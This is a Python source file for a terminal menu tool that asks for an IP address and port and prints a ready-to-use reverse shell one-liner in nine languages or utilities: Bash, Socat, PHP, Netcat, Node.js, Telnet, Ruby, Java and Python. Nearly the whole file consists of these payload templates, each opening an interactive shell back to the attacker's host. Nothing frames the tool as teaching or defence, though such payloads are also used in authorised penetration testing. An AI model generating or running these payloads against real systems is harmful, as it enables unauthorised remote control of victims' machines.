import os
import sys

from modules.banner import xe_header


Green = "\033[1;33m"
Blue = "\033[1;34m"
Grey = "\033[1;30m"
Reset = "\033[0m"
Red = "\033[1;31m"


def Menu():

    os.system("clear")

    menu_items = (
        [
            'Bash', 'Socat', 'PHP',
            'Netcat', 'Node.js', 'Telnet',
            'Ruby', 'Java', 'Python'
        ]
    )
    menu_id = 1

    print(xe_header())

    for platform in menu_items:
        print("     "+Grey+"["+Blue+str(menu_id) +
              Grey+"]-["+Green+platform+Grey+"]")
        menu_id = menu_id + 1

    print("")

    menu_options = input("     "+Grey+"$: "+Reset)

    if menu_options == "99":
        ENDst()

    else:
        try:
            menu_options = int(menu_options) - 1
            ltd = menu_items[menu_options]
            Menu.module = str(ltd.lower())
            Banner()
        except Exception:
            Menu()


def Banner():

    os.system("reset")

    print(xe_header())
    print("                               "+Blue+"______________________________"+Grey +
          " ["+Blue+Menu.module+Grey+"]"+Blue+"_________________________________"+Reset+"\n\n")

    if Menu.module == "bash":
        bashReverseShell()

    elif Menu.module == "socat":
        socatReverseShell()

    elif Menu.module == "php":
        phpReverseSHell()

    elif Menu.module == "netcat":
        netcatReverseShell()

    elif Menu.module == "node.js":
        nodeReverseSHell()

    elif Menu.module == "telnet":
        telnetReverseShell()

    elif Menu.module == "ruby":
        rubyReverseShell()

    elif Menu.module == "java":
        javaReverseSHell()

    elif Menu.module == "python":
        pythonReverseSHell()



''' bash reverse shell '''


def bashReverseShell():

    ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset+Blue)
    port = input("     "+Grey+"["+Blue+"Port"+Grey+"]"+Green+": "+Reset+Blue)

    print("")
    print("")

    result = Grey+"     ["+Red+"Your reverse shell code"+Grey+"]"+Green+": " + \
        Green+"bash -i >& /dev/tcp/{ip}/{port} 0>&1".format(ip=ip, port=port)

    print(result)
    print("")
    print("     "+Grey+"["+Blue+"1"+Grey+"]-["+Green+"Go to Menu"+Grey+"]")
    print("     "+Grey+"["+Blue+"2"+Grey+"]-["+Green+"Exit"+Grey+"]")
    print("")
    option = input(
        "     "+Grey+"["+Blue+"What do you want to do"+Grey+"]"+Green+"?- "+Grey)

    if option == "1":
        Menu()
    elif option == "2":
        ENDst()


''' socat reverse shell '''


def socatReverseShell():
    ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset+Blue)
    port = input("     "+Grey+"["+Blue+"Port"+Grey+"]"+Green+": "+Reset+Blue)

    print("")
    print("")

    result = Grey+"     ["+Red+"Your reverse shell code"+Grey+"]"+Green+": "+Green + \
        "socat tcp:{ip}:{port} exec:'bash -i' ,pty,stderr,setsid,sigint,sane &".format(
            ip=ip, port=port)
    print(result)
    print("")
    print("     "+Grey+"["+Blue+"1"+Grey+"]-["+Green+"Go to Menu"+Grey+"]")
    print("     "+Grey+"["+Blue+"2"+Grey+"]-["+Green+"Exit"+Grey+"]")
    print("")
    option = input(
        "     "+Grey+"["+Blue+"What do you want to do"+Grey+"]"+Green+"?- "+Grey)

    if option == "1":
        Menu()
    elif option == "2":
        ENDst()


''' php reverse shell '''


def phpReverseSHell():
    ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset+Blue)
    port = input("     "+Grey+"["+Blue+"Port"+Grey+"]"+Green+": "+Reset+Blue)

    print("")
    print("")

    result = Grey+"     ["+Red+"Your reverse shell code"+Grey+"]"+Green+": "+Green + \
        "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");?>".format(
            ip=ip, port=port)
    print(result)
    print("")
    print("     "+Grey+"["+Blue+"1"+Grey+"]-["+Green+"Go to Menu"+Grey+"]")
    print("     "+Grey+"["+Blue+"2"+Grey+"]-["+Green+"Exit"+Grey+"]")
    print("")
    option = input(
        "     "+Grey+"["+Blue+"What do you want to do"+Grey+"]"+Green+"?- "+Grey)

    if option == "1":
        Menu()
    elif option == "2":
        ENDst()


''' node reverse shell '''


def nodeReverseSHell():
    ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset+Blue)
    port = input("     "+Grey+"["+Blue+"Port"+Grey+"]"+Green+": "+Reset+Blue)

    print("")
    print("")

    result = Grey+"     ["+Red+"Your reverse shell code"+Grey+"]"+Green+": "+Green + \
        "require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1');".format(
            ip=ip, port=port)
    print(result)
    print("")
    print("     "+Grey+"["+Blue+"1"+Grey+"]-["+Green+"Go to Menu"+Grey+"]")
    print("     "+Grey+"["+Blue+"2"+Grey+"]-["+Green+"Exit"+Grey+"]")
    print("")
    option = input(
        "     "+Grey+"["+Blue+"What do you want to do"+Grey+"]"+Green+"?- "+Grey)

    if option == "1":
        Menu()
    elif option == "2":
        ENDst()


''' telnet reverse shell '''


def telnetReverseShell():
    ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset+Blue)
    port_command = input(
        "     "+Grey+"["+Blue+"Port command execute"+Grey+"]"+Green+": "+Reset+Blue)
    port_printed = input(
        "     "+Grey+"["+Blue+"Port command printed"+Grey+"]"+Green+": "+Reset+Blue)

    print("")
    print("")

    result = Grey+"     ["+Red+"Your reverse shell code"+Grey+"]"+Green+": "+Green + \
        "telnet {ip} {port_command} | /bin/bash | telnet {ip} {port_printed} ".format(
            ip=ip, port_command=port_command, port_printed=port_printed)
    print(result)
    print("")
    print("     "+Grey+"["+Blue+"1"+Grey+"]-["+Green+"Go to Menu"+Grey+"]")
    print("     "+Grey+"["+Blue+"2"+Grey+"]-["+Green+"Exit"+Grey+"]")
    print("")
    option = input(
        "     "+Grey+"["+Blue+"What do you want to do"+Grey+"]"+Green+"?- "+Grey)

    if option == "1":
        Menu()
    elif option == "2":
        ENDst()


''' python reverse shell '''


def pythonReverseSHell():
    ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset+Blue)
    port = input("     "+Grey+"["+Blue+"Port"+Grey+"]"+Green+": "+Reset+Blue)

    print("")
    print("")

    result = Grey+"     ["+Red+"Your reverse shell code"+Grey+"]"+Green+": " + \
        Green + \
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(
            ip=ip, port=port)

    print(result)
    print("")
    print("     "+Grey+"["+Blue+"1"+Grey+"]-["+Green+"Go to Menu"+Grey+"]")
    print("     "+Grey+"["+Blue+"2"+Grey+"]-["+Green+"Exit"+Grey+"]")
    print("")
    option = input(
        "     "+Grey+"["+Blue+"What do you want to do"+Grey+"]"+Green+"?- "+Grey)

    if option == "1":
        Menu()
    elif option == "2":
        ENDst()


''' ruby reverse shell '''


def rubyReverseShell():
    ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset+Blue)
    port = input("     "+Grey+"["+Blue+"Port"+Grey+"]"+Green+": "+Reset+Blue)

    print("")
    print("")

    result = Grey+"     ["+Red+"Your reverse shell code"+Grey+"]"+Green+": " + \
        Green + \
        "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(
            ip=ip, port=port)

    print(result)
    print("")
    print("     "+Grey+"["+Blue+"1"+Grey+"]-["+Green+"Go to Menu"+Grey+"]")
    print("     "+Grey+"["+Blue+"2"+Grey+"]-["+Green+"Exit"+Grey+"]")
    print("")
    option = input(
        "     "+Grey+"["+Blue+"What do you want to do"+Grey+"]"+Green+"?- "+Grey)

    if option == "1":
        Menu()
    elif option == "2":
        ENDst()


''' java reverse shell '''


def javaReverseSHell():
    ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset+Blue)
    port = input("     "+Grey+"["+Blue+"Port"+Grey+"]"+Green+": "+Reset+Blue)

    print("")
    print("")

    result = Grey+"     ["+Red+"Your reverse shell code"+Grey+"]"+Green+": " + \
        Green + \
        "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor()".format(
            ip=ip, port=port)

    print(result)
    print("")
    print("     "+Grey+"["+Blue+"1"+Grey+"]-["+Green+"Go to Menu"+Grey+"]")
    print("     "+Grey+"["+Blue+"2"+Grey+"]-["+Green+"Exit"+Grey+"]")
    print("")
    option = input(
        "     "+Grey+"["+Blue+"What do you want to do"+Grey+"]"+Green+"?- "+Grey)

    if option == "1":
        Menu()
    elif option == "2":
        ENDst()


''' netcat reverse shell '''


def netcatReverseShell():
    ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset+Blue)
    port = input("     "+Grey+"["+Blue+"Port"+Grey+"]"+Green+": "+Reset+Blue)

    print("")
    print("")

    result = Grey+"     ["+Red+"Your reverse shell code"+Grey+"]"+Green+": " + \
        Green + \
        "/bin/sh | nc {ip} {port}".format(
            ip=ip, port=port)

    print(result)
    print("")
    print("     "+Grey+"["+Blue+"1"+Grey+"]-["+Green+"Go to Menu"+Grey+"]")
    print("     "+Grey+"["+Blue+"2"+Grey+"]-["+Green+"Exit"+Grey+"]")
    print("")
    option = input(
        "     "+Grey+"["+Blue+"What do you want to do"+Grey+"]"+Green+"?- "+Grey)

    if option == "1":
        Menu()
    elif option == "2":
        ENDst()


def ENDst():
    os.system('clear')
    print(Green+"""                                                                        """)
    print("                         "+Grey +
          "["+Green+"+"+Grey+"]"+Reset+" FOLLOW ME ON: "+Grey+"["+Green+"+"+Grey+"]\n")
    print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"GITHUB" +
          Grey+"]:"+Reset+" https://github.com/shakarr ")
    print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"TWITTER" +
          Grey+"]:"+Reset+" https://twitter.com/shakar_zr ")
    print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"INSTAGRAM"+Grey +
          "]:"+Reset+" https://www.instagram.com/ridel_shakar ")
    print('                              ' +
          Reset+'-'+Grey+'Stay Weeb'+Reset+'-\n')
    sys.exit(0)


if __name__ == "__main__":
    try:
        Menu()
    except KeyboardInterrupt:
        ENDst()
